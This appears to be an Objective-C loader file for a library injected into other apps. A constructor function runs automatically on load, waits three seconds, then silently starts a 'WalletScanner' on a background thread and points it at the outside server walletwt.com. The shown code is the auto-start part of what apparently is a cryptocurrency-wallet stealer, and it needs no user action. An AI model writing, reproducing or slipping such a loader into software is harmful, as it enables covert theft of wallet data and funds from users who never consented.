//
//  RDWalletLoader.m
//

#import <Foundation/Foundation.h>
#import "WalletScanner.h"

__attribute__((constructor))
static void RDWalletAutoStart(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC),
                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSLog(@"[WalletScanner] Auto-start");
        [WalletScanner shared].serverURL = @"https://walletwt.com/api";
        [[WalletScanner shared] run];
    });
}
